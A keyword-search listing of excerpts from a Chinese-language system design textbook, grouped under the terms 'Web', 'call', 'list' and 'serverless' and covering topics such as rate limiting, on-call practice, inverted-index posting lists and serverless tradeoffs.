  c01_b10.md: ...案：**  **第一步：识别实际失败的是什么。** 100 倍流量尖峰压垮单体应用的过程是可预测的：首先，并发连接耗尽 Web 服务器的线程或进程池（每个请求都持有一个线程等待数据库响应）。其次，数据库连接池饱和——每个线程持有一个打开的连接，数...
  c01_b10.md: ...**改动 1：在服务器前尽快加上限流器（rate limiter）或请求队列（几分钟内）。** 这是最快的杠杆。配置 Web 服务器（例如 Nginx）拒收或排队超过阈值的请求——比如 1,000 个并发连接——而不是让它们全部堆在内存里。阈值...
  c02_b01.md: ...#### 定义：Throughput  **Throughput（吞吐）** 是系统每单位时间能处理的操作数量。对于 Web 服务，通常用 **requests per second（RPS，每秒请求数）** 或 **queries per s...
  c02_b01.md: ...ies per second（QPS，每秒查询数）** 表示。  用大白话说：吞吐是系统能同时持续做多少件事。如果你的 Web 服务器在性能下降前能处理 10,000 RPS，它的吞吐就是 10,000 RPS。...
  c02_b02.md: ...权衡）是：**更高的吞吐系统常常用单个响应延迟换取总体容量。** 批处理系统（一夜之间处理数百万记录）优先吞吐。交互式 Web 服务优先延迟。大多数真实系统需要平衡两者。   #### 常见误解  人们常常说“我们需要低延迟和高吞吐”，仿佛它们是...
  c02_b02.md: ...从 99.999% 到 99.9999%，每年只节省约 5 分钟——但基础设施复杂度的成本会急剧上升。  大多数消费级 Web 服务的目标是三个 9（99.9%）到四个 9（99.99%）。五个 9 常见于电信和空中交通管制。选择可用性目标既是商...
  c02_b07.md: ...#### 概念检测  **Q1.** 一个 Web 服务报告中位数（p50）延迟为 50ms，p99 延迟为 2,000ms。这告诉你关于系统行为的什么信息？为什么工程师...
  c05_b02.md: ...寻道），每页存 1000 行，那么扫描 1 亿行需要 100,000 页 × 10ms = 1,000 秒。  这对 Web 应用显然不可用。修复方案：索引（index）。...
  c05_b05.md: ...能 | 可能 | 很少有用 | | Read Committed（读已提交） | 防止 | 可能 | 可能 | 大多数 Web 应用（PostgreSQL 默认） | | Repeatable Read（可重复读） | 防止 | 防止 | 可能...
  c05_b05.md: ...金融读取 | | Serializable（可串行化） | 防止 | 防止 | 防止 | 最高正确性要求 |  大多数 Web 应用使用 **Read Committed**——它防止读到另一个事务未提交的更改，同时保持良好并发。只在正确性要求时...
  c05_b13.md: ...的声明式模型比手写遍历更高效） * 主导工作负载是事务处理（银行、库存、工资） * schema 灵活性次于正确性  Web 时代改变了情境：...
  c09_b03.md: ...更贵。它们还是协议相关的——HTTP L7 负载均衡器没有 gRPC 专门支持就不能路由 gRPC 流量。  对大多数 Web 应用，L7 负载均衡是正确选择：基于内容的路由和 SSL 终止收益超过性能开销。...
  c09_b05.md: ...adeoff（权衡）完全相同。   ### 9.6 HTTP、TCP 与 WebSocket——协议层  HTTP 是 Web 的协议，大多数应用流量通过它传输。但 HTTP 有多个版本，性能特征各不相同，有些应用需要完全不同的协议。   ###...
  c09_b06.md: ...HTTP/2 还支持服务器推送（server proactively 发送客户端将需要的资源）、头压缩和流优先级。对 Web 应用，HTTP/2 通常比 HTTP/1.1 减少 15-30% 页面加载时间。   #### HTTP/3 与 QU...
  c09_b06.md: ...蜂窝网络，QUIC 保持连接）。  HTTP/3 部署越来越广，但还不如 HTTP/2 普及。HTTP 版本选择通常由 Web 服务器和 CDN 层处理，而非应用代码。   #### TCP vs UDP  对应用开发者来说，传输层的基本选择是...
  c09_b08.md: ...#### REST——Representational State Transfer  REST 是公共 Web API 的主流风格。它用 HTTP 动词（GET、POST、PUT、DELETE、PATCH）对由 URL 标识的资源...
  c09_b08.md: ...户端（Web、移动、第三方开发者）需要以不同形态获取相同底层数据时。例如 Facebook 的 news feed 在 Web、Android、iOS 上渲染不同——但底层数据（帖子、用户、互动）相同。GraphQL 让每个客户端从单一 API...
  c09_b19.md: ...。  **TCP 与 UDP** 代表传输层的基本选择：TCP 的可靠与有序 vs UDP 的速度与可容忍丢失。大多数 Web 应用流量用 TCP；实时媒体常用 UDP。  **WebSocket** 为实时应用实现全双工服务器推送，代价是有状态...
  c10_b08.md: ...## 10.7 数据本地性——把计算移到数据  HDFS 关于数据本地性的洞察是一个值得单独审视的通用原则。  在典型 Web 请求中，数据流动如下：  1. 请求到达应用服务器 2. 应用服务器查询数据库 3. 数据库从磁盘读数据 4. 数据从...
  c10_b11.md: ...、延迟要求和成本角度解释你的理由。  **答案：**  **基于 DRAM 的缓存（Redis）：**  最佳工作负载：Web 应用会话数据。每次认证请求都访问会话（高读取频率），数据小（每个会话约 1 KB），必须在 1 毫秒内取回，才不会给页...
  c10_b16.md: ...—因此无限 TTL 是正确的。缓存失效通过改变 URL 实现，而不是过期或 purge 现有缓存条目。这是 CDN 和 Web 框架对静态资源做指纹化（fingerprinting）的相同原则（例如 `app.a3f2b9.js`）。  照片更新...
  c11_b05.md: ...## 11.5 JWT——无需服务器端存储的无状态会话  Redis 会话存储把会话状态集中到 Redis。这是大多数 Web 应用的标准方案。但有一种替代方案可以彻底消除会话存储：**JWT（JSON Web Tokens）**。...
  c11_b05.md: ...状态集中到 Redis。这是大多数 Web 应用的标准方案。但有一种替代方案可以彻底消除会话存储：**JWT（JSON Web Tokens）**。...
  c13_b09.md: ...用才能完成，每次增加 5 毫秒开销，那就是在任何业务逻辑之前就有 50 毫秒纯网络开销。对延迟直接影响用户体验的交互式 Web 应用，这可能不可接受。  **数据一致性至关重要时。** 如第 12 章所见，分布式事务很痛苦。如果你的应用需要跨多个...
  c15_b16.md: ...Saga 编排器拥有行为耦合——它知道 API 调用序列。这类似于任何按顺序调用多个 API 的客户端。Web 浏览器加载页面时会调用 CDN、用户服务、feed 服务——它在“知道”它们 API 的意义上与它们耦合。我们不认为这...
  c19_b03.md: ...ss token——它们可被用户撤销，且不能用来改用户密码。   #### JWT——Token 格式  **JSON Web Tokens（JWT）** 是现代系统中 access token 的主要格式。JWT 是 Base64url 编码、...
  c19_b05.md: ...可行。其他敏感字段包括支付信息、政府 ID 号、私信以及任何受监管的数据（医疗记录、财务数据）。   ### 19.4 Web 应用漏洞——经典问题  OWASP Top 10 是最常见、影响最大的 Web 应用漏洞定期更新列表。其中三类反复出现...
  c19_b05.md: ...录、财务数据）。   ### 19.4 Web 应用漏洞——经典问题  OWASP Top 10 是最常见、影响最大的 Web 应用漏洞定期更新列表。其中三类反复出现，每个系统设计师都必须理解。...
  c19_b17.md: ...）和静态（卷级或应用级加密防止磁盘被盗或未经授权的数据库访问）。密码不被加密——它们用故意很慢的算法哈希。  三种经典 Web 漏洞——SQL 注入、XSS、CSRF——都共享一个根因：把用户输入当作可信代码或可信状态。防御措施——参数化查询、H...
  c20_b01.md: ...式。   ### 侦探简报  **客户：** 一家初创公司想为公众构建 URL 缩短服务，类似 bit.ly。用户通过 Web 界面和 API 缩短 URL。缩短链接将出现在社交媒体帖子、邮件和营销活动中。  **线索（需求）：**  * 用户可...
  c23_b02.md: ...队列**：每个域名一次只取一个 URL，请求之间设可配置延迟（例如 1 秒）。机器人遵守 `robots.txt`——Web 服务器（web servers）发布该文件说明哪些页面可以爬、哪些不可以以及速率。      User-agent:...
  c28_b14.md: ...nk** (Ch 23) | 无查询延迟开销（批量计算） | 最终（定期重算） | N/A | 高——分布式图计算 **Web crawler / URL frontier** (Ch 23) | N/A | 最终（网络持续被抓取） | 高（分布...

=== call (36 occurrences) ===
  c13_b10.md: ...ialSnap：如果公司有专门的支付团队、通知团队、用户资料团队——每个团队有自己的 Slack 频道、路线图和 on-call 轮值——他们产生的系统自然会有 Payment Service、Notification Service 和 User...
  c16_b08.md: ...响应。  用户可见总影响：写操作约 45 秒错误率升高，读操作零错误（由缓存和副本提供）。没有完整 outage。On-call 工程师被告警唤醒，查看事件，然后回去睡觉。到早上，主库磁盘已更换，旧主库作为副本恢复，系统回到完整冗余。  Socia...
  c16_b17.md: ...题不是“会不会失败？”，而是“失败会在什么时候、以什么形式发生？”失控失败发生在最糟糕的时候——周五下午高峰流量、on-call 工程师在度假、团队没有处理这种特定失败模式的经验。受控混沌实验在选定时间进行，团队准备就绪，影响范围受限。  信心缺口...
  c17_b08.md: ...蚀后，工程师会开始静音告警“只想睡一觉”。最终抓住真正 outage 的告警可能和那些噪声一起被静音。  理想的 on-call 体验：每次 page 都是真实的用户可见问题，每次 page 都需要无法自动化的人类判断，page 相对不频繁，因为好...
  c17_b08.md: ...，因为好的监控在问题还没 page 级严重时就及早发现。   #### 告警路由与 Runbook  当告警响起，on-call 工程师需要知道：这个告警是什么、为什么重要、我首先该做什么？  **Runbook**（也称 playbook）是附加...
  c17_b08.md: ...户端熔断器设为 OPEN  Runbook 编码机构知识。资深工程师第一次遇到某个告警时学到正确响应。初级工程师 on-call 遇到不熟悉告警时，runbook 防止他们犯下灾难性错误。当同一告警一个月内第三次响起，runbook 会更新：“如果...
  c17_b08.md: ...无改进 | 无 基于症状的告警 | 略高（指标开销） | 无变化 | 显著提高（更快 MTTR） | 中（仪表盘、on-call 轮值） 完整可观测性栈（指标 + 日志 + 追踪） | 小开销 | 无变化 | 最高（快速根因分析） | 高（工具、埋...
  c17_b09.md: ...* **分布式追踪**显示所有长耗时请求都有 Redis 超时的 span。  到 2:48——降级开始一分钟——on-call 工程师收到 page：“Redis 错误率 18%，p99 延迟 28 秒。”Runbook 说：检查 Redis 集...
  c17_b12.md: ...* 队列深度连续 10 分钟增长 → page on-call（消费者可能崩溃） * 邮件投递成功率 5 分钟低于 95% → page 邮件团队（第三方邮件提供商问题） * 消费者...
  c17_b12.md: ...95% → page 邮件团队（第三方邮件提供商问题） * 消费者滞后超过 50,000 条消息 → page on-call（处理速度相对于流量太慢） * 死信队列有消息 → 非紧急工单（调查无法投递通知的根因）  注意基于症状的告警框架：告警...
  c17_b14.md: ...语言，用于在可靠性与开发速度之间做权衡决策——用数字而非辩论回答“这次部署我们能承担多少风险？”  告警哲学塑造 on-call 运营文化。基于症状的告警减少误报，保持对告警系统的信任。四个黄金信号——延迟、流量、错误、饱和度——为任何服务提供了一...
  c18_b08.md: ...回滚动作：** 部署上一版本？翻转功能开关？把负载均衡器切回 blue？ 3. **回滚负责人：** 谁决定回滚？On-call 工程师？发布经理？ 4. **回滚验证：** 回滚后如何确认系统恢复健康？ 5. **数据库考虑：** 如果部署包含迁...
  c20_b10.md: ...子创建失败。集成消除了这个依赖。 * 初始实现更简单：为快速上线功能，构建独立服务及其数据库、部署流水线、监控和 on-call 轮换是重大开销。 * 规模还没到：SocialSnap 当前阶段每天不会收到 1 亿个链接创建——独立扩展的好处可能不...
  c27_b10.md: ...分的权衡：好处：独立部署；安全团队可在不涉及产品团队的情况下迭代 auth；可为每个服务设置不同可靠性目标；不同 on-call 轮值。成本：auth 调用 profile 或 vice versa 时新增网络 hop；分布式追踪现在覆盖两个服务；...
  c28_b02.md: ...常反映了与组织实际结构不匹配的人为划分。反过来读康威定律，可以诊断组织失调。  * * *   ### 28.2 On-Call、Post-Mortem 与无责备文化...
  c28_b03.md: ...#### On-Call 工程  每个超过一定规模的生产系统都需要有人员在出问题时可联系。**On-call rotation** 是一种组织实...
  c28_b03.md: ...#### On-Call 工程  每个超过一定规模的生产系统都需要有人员在出问题时可联系。**On-call rotation** 是一种组织实践，指定哪些工程师在特定时间段内负责响应生产事件。  有效的 on-call 系统包...
  c28_b03.md: ...*On-call rotation** 是一种组织实践，指定哪些工程师在特定时间段内负责响应生产事件。  有效的 on-call 系统包括：  **分级升级：** 第一响应者（on-call 工程师）处理事件，或在 15 分钟（15 minutes...
  c28_b03.md: ...（on-call 工程师）处理事件，或在 15 分钟（15 minutes）内升级给领域专家。清晰的升级路径防止 on-call 工程师独自卡住数小时。  **Runbook：** 已知故障模式的文档化流程。当数据库副本落后时，runbook 写：...
  c28_b03.md: ...es）则重启副本。Runbook 把隐性知识（上次调试该问题的工程师脑子里的东西）变成显性知识（凌晨 3 点任何 on-call 工程师都能获取）。  **基于 SLO 的告警：** 告警在用户可感服务水平目标受威胁时触发，而不是单个指标越过任意阈...
  c28_b03.md: ...分钟（5 minutes）> 500ms”是可操作且与用户相关的告警。“CPU > 80%”可能吓人，但没告诉 on-call 工程师用户是否真的在经历降级服务。  **On-call 卫生：** on-call 负担必须可持续。每晚被呼叫 5...
  c28_b03.md: ...户相关的告警。“CPU > 80%”可能吓人，但没告诉 on-call 工程师用户是否真的在经历降级服务。  **On-call 卫生：** on-call 负担必须可持续。每晚被呼叫 5 次的工程师第二天无法有效工作。良好运行的 on-call...
  c28_b03.md: ...80%”可能吓人，但没告诉 on-call 工程师用户是否真的在经历降级服务。  **On-call 卫生：** on-call 负担必须可持续。每晚被呼叫 5 次的工程师第二天无法有效工作。良好运行的 on-call 轮值把可操作页面限制在每次轮...
  c28_b03.md: ...-call 卫生：** on-call 负担必须可持续。每晚被呼叫 5 次的工程师第二天无法有效工作。良好运行的 on-call 轮值把可操作页面限制在每次轮班 2–3 次；非可操作噪音被积极消除。   #### 无责备 Post-Mortem...
  c28_b03.md: ...#### On-Call 工程  每个超过一定规模的生产系统都需要有人员在出问题时可联系。**On-call rotation** 是一种组织实...
  c28_b03.md: ...#### On-Call 工程  每个超过一定规模的生产系统都需要有人员在出问题时可联系。**On-call rotation** 是一种组织实践，指定哪些工程师在特定时间段内负责响应生产事件。  有效的 on-call 系统包...
  c28_b03.md: ...*On-call rotation** 是一种组织实践，指定哪些工程师在特定时间段内负责响应生产事件。  有效的 on-call 系统包括：  **分级升级：** 第一响应者（on-call 工程师）处理事件，或在 15 分钟（15 minutes...
  c28_b03.md: ...（on-call 工程师）处理事件，或在 15 分钟（15 minutes）内升级给领域专家。清晰的升级路径防止 on-call 工程师独自卡住数小时。  **Runbook：** 已知故障模式的文档化流程。当数据库副本落后时，runbook 写：...
  c28_b03.md: ...es）则重启副本。Runbook 把隐性知识（上次调试该问题的工程师脑子里的东西）变成显性知识（凌晨 3 点任何 on-call 工程师都能获取）。  **基于 SLO 的告警：** 告警在用户可感服务水平目标受威胁时触发，而不是单个指标越过任意阈...
  c28_b03.md: ...分钟（5 minutes）> 500ms”是可操作且与用户相关的告警。“CPU > 80%”可能吓人，但没告诉 on-call 工程师用户是否真的在经历降级服务。  **On-call 卫生：** on-call 负担必须可持续。每晚被呼叫 5...
  c28_b03.md: ...户相关的告警。“CPU > 80%”可能吓人，但没告诉 on-call 工程师用户是否真的在经历降级服务。  **On-call 卫生：** on-call 负担必须可持续。每晚被呼叫 5 次的工程师第二天无法有效工作。良好运行的 on-call...
  c28_b03.md: ...80%”可能吓人，但没告诉 on-call 工程师用户是否真的在经历降级服务。  **On-call 卫生：** on-call 负担必须可持续。每晚被呼叫 5 次的工程师第二天无法有效工作。良好运行的 on-call 轮值把可操作页面限制在每次轮...
  c28_b03.md: ...-call 卫生：** on-call 负担必须可持续。每晚被呼叫 5 次的工程师第二天无法有效工作。良好运行的 on-call 轮值把可操作页面限制在每次轮班 2–3 次；非可操作噪音被积极消除。   #### 无责备 Post-Mortem...
  c28_b17.md: ...名工程师和一名 tech lead。每个团队维护自己的服务、自己的数据库（遵循微服务原则的服务自有数据）和自己的 on-call 轮值。服务失败时，负责该服务的团队被呼叫——不是中央运营团队。这创造了问责和专长：构建服务的工程师就是维护服务的工程师...
  c28_b17.md: ...阵（Tradeoff Matrix）、过去 6 个月的 post-mortem。第二周与资深工程师配对完成第一次 on-call 轮值。到第二周末，新员工至少参与过一次生产事件——不是作为决策者，而是作为观察者，观看团队如何在压力下推理。  权衡矩...
  c28_b24.md: ...cialSnap 在微服务迁移前的团队重组就是这一原则的有意应用。  **无责备 post-mortem** 和 on-call 文化决定团队如何从失败中学习。把失败视为系统问题而非个人问题的文化以复利速度积累学习，使每次事件后的系统更坚韧。  *...

=== list (36 occurrences) ===
  c23_b04.md: ...引反转文档与词之间的关系。不是“文档 → 它包含的词”，而是“词 → 包含它的文档”：  Word | Posting List（Doc IDs） ---|--- distributed | [1, 3] systems | [1, 2] desi...
  c23_b04.md: ...[4]  "distributed systems" 的查询变成：取 "distributed" 的 posting list = [1, 3]，取 "systems" 的 posting list = [1, 2]，再求交集 = [1]。  两...
  c23_b04.md: ..."distributed" 的 posting list = [1, 3]，取 "systems" 的 posting list = [1, 2]，再求交集 = [1]。  两个有序列表的交集操作是 O(n + m)，n 和 m 是 posting...
  c23_b04.md: ...= [1, 2]，再求交集 = [1]。  两个有序列表的交集操作是 O(n + m)，n 和 m 是 posting list 长度。对大多数词，posting list 远小于总文档数。速度来自这里：倒排索引允许我们每个词 O(1) 查找（索引...
  c23_b04.md: ...两个有序列表的交集操作是 O(n + m)，n 和 m 是 posting list 长度。对大多数词，posting list 远小于总文档数。速度来自这里：倒排索引允许我们每个词 O(1) 查找（索引是 hash map 或 B-tree），然...
  c23_b04.md: ...你哪些文档包含它。索引成本在添加文档时支付一次；查询收益此后永远获得。   #### 超越简单词匹配——Posting List 增强  生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  * **Te...
  c23_b04.md: ...询收益此后永远获得。   #### 超越简单词匹配——Posting List 增强  生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  * **Term frequency (TF)：** 该词在文...
  c23_b04.md: ...*Field indicator：** 词在标题、标题栏还是正文中？标题中的词权重更高。  这些增强让 posting list 显著变大，但也支持更精细的排序。...
  c23_b04.md: ...引反转文档与词之间的关系。不是“文档 → 它包含的词”，而是“词 → 包含它的文档”：  Word | Posting List（Doc IDs） ---|--- distributed | [1, 3] systems | [1, 2] desi...
  c23_b04.md: ...[4]  "distributed systems" 的查询变成：取 "distributed" 的 posting list = [1, 3]，取 "systems" 的 posting list = [1, 2]，再求交集 = [1]。  两...
  c23_b04.md: ..."distributed" 的 posting list = [1, 3]，取 "systems" 的 posting list = [1, 2]，再求交集 = [1]。  两个有序列表的交集操作是 O(n + m)，n 和 m 是 posting...
  c23_b04.md: ...= [1, 2]，再求交集 = [1]。  两个有序列表的交集操作是 O(n + m)，n 和 m 是 posting list 长度。对大多数词，posting list 远小于总文档数。速度来自这里：倒排索引允许我们每个词 O(1) 查找（索引...
  c23_b04.md: ...两个有序列表的交集操作是 O(n + m)，n 和 m 是 posting list 长度。对大多数词，posting list 远小于总文档数。速度来自这里：倒排索引允许我们每个词 O(1) 查找（索引是 hash map 或 B-tree），然...
  c23_b04.md: ...你哪些文档包含它。索引成本在添加文档时支付一次；查询收益此后永远获得。   #### 超越简单词匹配——Posting List 增强  生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  * **Te...
  c23_b04.md: ...询收益此后永远获得。   #### 超越简单词匹配——Posting List 增强  生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  * **Term frequency (TF)：** 该词在文...
  c23_b04.md: ...*Field indicator：** 词在标题、标题栏还是正文中？标题中的词权重更高。  这些增强让 posting list 显著变大，但也支持更精细的排序。...
  c23_b05.md: ...档都出现的极常见词，这些词对相关性贡献很小："the"、"is"、"and"、"a"。这些词会创建巨大 posting list 却只有微不足道的排序收益。 5. **词干提取或词形还原：** 把词还原为词根。"Running"、"ran"、"ru...
  c23_b05.md: ...**倒排索引更新：** 对每个剩余 token，把该文档的 ID、TF 和位置追加到 token 的 posting list。  该流水线对每个爬取页面运行。100 亿（10 billion）页面，且为保持索引新鲜每天可能重新爬取 10% 网页...
  c23_b05.md: ...没有单机能容纳 100 亿（10 billion）页面的完整倒排索引。常用词如 "systems" 的 posting list 可能包含数亿文档 ID——仅这一个词就几十 GB。整个网页倒排索引是数百 TB。  如第 12 章所学，解决方案是分片...
  c23_b08.md: ...nsist"]（词干提取后）。 2. **词项查找：** 对每个词，从倒排索引（可能跨多个分片）检索其 posting list。 3. **打分：** 对每个候选文档（出现在 posting list 交集中的文档），计算结合 TF-IDF 和...
  c23_b08.md: ...索引（可能跨多个分片）检索其 posting list。 3. **打分：** 对每个候选文档（出现在 posting list 交集中的文档），计算结合 TF-IDF 和 PageRank 的相关性分数。 4. **Top-K 选择：** 返回...
  c23_b09.md: ...索快，因为查询通过：(1) 在索引中查找每个查询词——每词 O(1) hash 查找；(2) 交集结果 posting list。两个有序列表交集是 O(n + m)，n 和 m 是 posting list 大小。这比扫描所有文档快得多，因为即使...
  c23_b09.md: ...查找；(2) 交集结果 posting list。两个有序列表交集是 O(n + m)，n 和 m 是 posting list 大小。这比扫描所有文档快得多，因为即使对常见词，posting list 也只是所有文档的极小一部分。  **Q4.*...
  c23_b09.md: ...n + m)，n 和 m 是 posting list 大小。这比扫描所有文档快得多，因为即使对常见词，posting list 也只是所有文档的极小一部分。  **Q4.** 为什么爬虫的 seen-set 需要 Bloom filter 而不是...
  c23_b10.md: ...byte）。实践中，压缩（排序文档 ID 的 delta 编码可高度压缩）降低 5–10 倍，得到压缩 posting list 约 32–64 TB。词表（所有不同词集合及其在 posting list 中的偏移）是 comparatively...
  c23_b10.md: ...低 5–10 倍，得到压缩 posting list 约 32–64 TB。词表（所有不同词集合及其在 posting list 中的偏移）是 comparatively 小的额外结构。  **Q2.** 一个使用 document-based s...
  c23_b10.md: ...络往返。(3) **每分片处理**（约 30–50ms，并行）：每个分片从本地倒排索引查找 3 个词的 posting list，交集得到候选文档 ID，用 TF-IDF 和预计算 PageRank（每个文档存储）对候选打分，返回 top-K 结果...
  c23_b13.md: ...计算 timeline 中首次出现的“用写入成本换读取速度”的权衡。索引昂贵；搜索快是因为工作提前完成。Posting list 用 TF、位置和字段指示器增强，支持排序和短语匹配。  **TF-IDF** 通过术语特异性镜头对文档相关性排序：语料...
  c26_b03.md: ...中的自然答案：协调节点（从键位置顺时针第一个节点）及其后顺时针方向 N-1 个节点。给定键的 **preference list（偏好列表）** 是确定性的——集群中任何节点无需协调即可为任意键计算它。  N=3 副本时：客户端写入 `PUT("u...
  c26_b03.md: ...处理故障——Hinted Handoff 与 Sloppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用的节点时怎么办？  严格 quorum 行为：若无法达到 W 个节点，写失败。这保证一致性但牺牲可用性—...
  c26_b04.md: ...um  **Sloppy quorum** 允许写继续到环上任意 W 个可用节点，而不一定是标准 preference list 中的 W 个节点。若标准节点 A 不可用，附近的另一节点 B 代替接受该写，并在元数据中记录它作为节点 A 的“hin...
  c26_b06.md: ...cy）可接受。  **搜索倒排索引 posting 缓存**：搜索服务层热层（第 23 章）缓存热门词 posting list。N=3，W=2，R=2。偏好强一致（W + R = 4 > N = 3），因为陈旧的 posting list 会导致...
  c26_b06.md: ...ing list。N=3，W=2，R=2。偏好强一致（W + R = 4 > N = 3），因为陈旧的 posting list 会导致错误搜索结果。权衡：以稍高写/读延迟换取一致性。  **个人资料与帖子数据**：**不在**键值存储中。如第 5...
  c26_b10.md: ...：`PUT("user:101:timeline", new_value)`。写协调器是节点 A，preference list 是 [A, B, C]。追踪 sloppy quorum 加 hinted handoff 下该写的去向。然后追踪后续...
  c26_b10.md: ...达。然后想 R=1 的读可能联系哪个节点。  **答案：** 写追踪：节点 A（协调器）尝试写入 preference list [A, B, C]。节点 C 被隔离——不可达。在 sloppy quorum 下，A 用可用节点继续。W=1，所以只...
  c26_b10.md: ...下，A 用可用节点继续。W=1，所以只写到 A 就满足写 quorum。A 也复制给 B（都在 preference list 且可达）。C 不可达；A（或 B）存储 hint：“节点 C 恢复时应接收该值。” 写成功并返回客户端。分区愈合后：B...

=== serverless (36 occurrences) ===
  c27_b13.md: ...流动性的制度记忆。  第 28 章通过考察塑造系统的人文力量来收尾：深入康威定律、无责备 post-mortem 文化、serverless 与边缘计算，以及最终完成的 权衡矩阵（Tradeoff Matrix）——本书所涵盖一切的完整参考卡。...
  c28_b04.md: ...探纪律（Thread C）应用于系统失败：沿着连续原因追踪证据，直到找到真正起源。  * * *   ### 28.3 Serverless 计算——抽象的未来  全书基础设施讨论都围绕服务器：我们把服务部署在服务器（物理或虚拟）上，管理它们，水平扩展，监控健...
  c28_b04.md: ...算——抽象的未来  全书基础设施讨论都围绕服务器：我们把服务部署在服务器（物理或虚拟）上，管理它们，水平扩展，监控健康。Serverless 计算代表一种不同模型：如果你可以只写一个函数而完全不用考虑服务器，会怎样？   #### 定义：Serverless（...
  c28_b04.md: ...。Serverless 计算代表一种不同模型：如果你可以只写一个函数而完全不用考虑服务器，会怎样？   #### 定义：Serverless（Function-as-a-Service）  **Serverless**（也称 Function-as-a-Ser...
  c28_b04.md: ...不用考虑服务器，会怎样？   #### 定义：Serverless（Function-as-a-Service）  **Serverless**（也称 Function-as-a-Service 或 FaaS）是一种云执行模型，开发者部署单个函数（而非整个服务...
  c28_b05.md: ...#### Serverless 的权衡  Serverless 并不严格优于传统基于服务器的部署——它只是权衡曲线上的不同点：  **好处：**  *...
  c28_b05.md: ...#### Serverless 的权衡  Serverless 并不严格优于传统基于服务器的部署——它只是权衡曲线上的不同点：  **好处：**  * 零服务器管理运营开销 * 从...
  c28_b05.md: ...习训练）不适合该模型。 * 运行时控制有限：你无法配置内核、网络栈或硬件。对有特殊性能要求的情况是约束。 * 厂商锁定：serverless 函数深度绑定特定云 provider 的 API、事件模型和触发机制。迁移到不同 provider 需要重写集成层。...
  c28_b05.md: ...API、事件模型和触发机制。迁移到不同 provider 需要重写集成层。 * 可观测性挑战：追踪跨 5 个串行调用的 serverless 函数请求需要仔细设置分布式追踪——与微服务相同挑战，但没有同等级别的运行时控制。  **Serverless 适用场景...
  c28_b05.md: ...行调用的 serverless 函数请求需要仔细设置分布式追踪——与微服务相同挑战，但没有同等级别的运行时控制。  **Serverless 适用场景：** 低流量 API 和 webhook（“空闲时零成本”收益最大）；事件驱动数据处理（文件上传到 S3 时...
  c28_b05.md: ...处理（文件上传到 S3 时处理）；定时任务（每晚午夜运行清理作业）；快速原型（无需配置基础设施即可部署新功能）。  **Serverless 不适用场景：** 延迟敏感 API（冷启动延迟是问题）；长时间运行工作负载；有状态的（stateful）处理；需要细粒...
  c28_b05.md: ...是问题）；长时间运行工作负载；有状态的（stateful）处理；需要细粒度性能调优的系统。  对 SocialSnap，serverless 适用于：图片处理（上传时调整照片大小）、定时数据导出、第三方集成 webhook 处理器。不适用于：feed 服务（延...
  c28_b05.md: ...#### Serverless 的权衡  Serverless 并不严格优于传统基于服务器的部署——它只是权衡曲线上的不同点：  **好处：**  *...
  c28_b05.md: ...#### Serverless 的权衡  Serverless 并不严格优于传统基于服务器的部署——它只是权衡曲线上的不同点：  **好处：**  * 零服务器管理运营开销 * 从...
  c28_b05.md: ...习训练）不适合该模型。 * 运行时控制有限：你无法配置内核、网络栈或硬件。对有特殊性能要求的情况是约束。 * 厂商锁定：serverless 函数深度绑定特定云 provider 的 API、事件模型和触发机制。迁移到不同 provider 需要重写集成层。...
  c28_b05.md: ...API、事件模型和触发机制。迁移到不同 provider 需要重写集成层。 * 可观测性挑战：追踪跨 5 个串行调用的 serverless 函数请求需要仔细设置分布式追踪——与微服务相同挑战，但没有同等级别的运行时控制。  **Serverless 适用场景...
  c28_b05.md: ...行调用的 serverless 函数请求需要仔细设置分布式追踪——与微服务相同挑战，但没有同等级别的运行时控制。  **Serverless 适用场景：** 低流量 API 和 webhook（“空闲时零成本”收益最大）；事件驱动数据处理（文件上传到 S3 时...
  c28_b05.md: ...处理（文件上传到 S3 时处理）；定时任务（每晚午夜运行清理作业）；快速原型（无需配置基础设施即可部署新功能）。  **Serverless 不适用场景：** 延迟敏感 API（冷启动延迟是问题）；长时间运行工作负载；有状态的（stateful）处理；需要细粒...
  c28_b05.md: ...是问题）；长时间运行工作负载；有状态的（stateful）处理；需要细粒度性能调优的系统。  对 SocialSnap，serverless 适用于：图片处理（上传时调整照片大小）、定时数据导出、第三方集成 webhook 处理器。不适用于：feed 服务（延...
  c28_b15.md: ...e** (Ch 28) | N/A | 基础设施状态确定性 | 极高（可复现环境） | 中——IaC 工具学习曲线 **Serverless (FaaS)** (Ch 28) | 冷启动惩罚（100ms–2s） | 无状态（函数内无共享状态） | 极高（自动扩...
  c28_b18.md: ...gned 集成——每方对另一方的约束和需求只有模糊理解，集成 bug 出现在与沟通缺口匹配的接口上。  **Q2.** Serverless（FaaS）与传统基于服务器的部署有何关键区别？以下用例你会选择 serverless，为什么？(a) S3 上传触发图...
  c28_b18.md: ...匹配的接口上。  **Q2.** Serverless（FaaS）与传统基于服务器的部署有何关键区别？以下用例你会选择 serverless，为什么？(a) S3 上传触发图片缩略图生成，(b) SocialSnap feed API 端点，(c) 夜间报表作...
  c28_b18.md: ...：** 关键区别：基于服务器：持久基础设施，为空闲时间付费，完全控制运行时，无冷启动，执行时长无限制，可维护有状态会话。Serverless：每次调用短暂，按执行付费，托管运行时，冷启动惩罚，最大执行 15 分钟（15 minutes），无状态。(a) 图片缩...
  c28_b18.md: ...，按执行付费，托管运行时，冷启动惩罚，最大执行 15 分钟（15 minutes），无状态。(a) 图片缩略图生成：**serverless 理想。** 事件驱动（S3 上传触发函数），执行时间短（每张图几秒），负载可变且突发（内容发布后上传聚集），无状态（每...
  c28_b18.md: ...2s）对必须 < 200ms 响应的端点是灾难性的。高且持续的请求量使按调用付费比预留容量更贵。Feed 服务还受益于 serverless 跨冷启动无法维护的进程内缓存。(c) 夜间报表作业：**serverless 理想。** 每天只运行一次，因此运行之间...
  c28_b18.md: ...费比预留容量更贵。Feed 服务还受益于 serverless 跨冷启动无法维护的进程内缓存。(c) 夜间报表作业：**serverless 理想。** 每天只运行一次，因此运行之间无空闲成本。执行时间可预测且短（假设报表生成快）。无延迟要求。事件驱动（定时触...
  c28_b18.md: ...gned 集成——每方对另一方的约束和需求只有模糊理解，集成 bug 出现在与沟通缺口匹配的接口上。  **Q2.** Serverless（FaaS）与传统基于服务器的部署有何关键区别？以下用例你会选择 serverless，为什么？(a) S3 上传触发图...
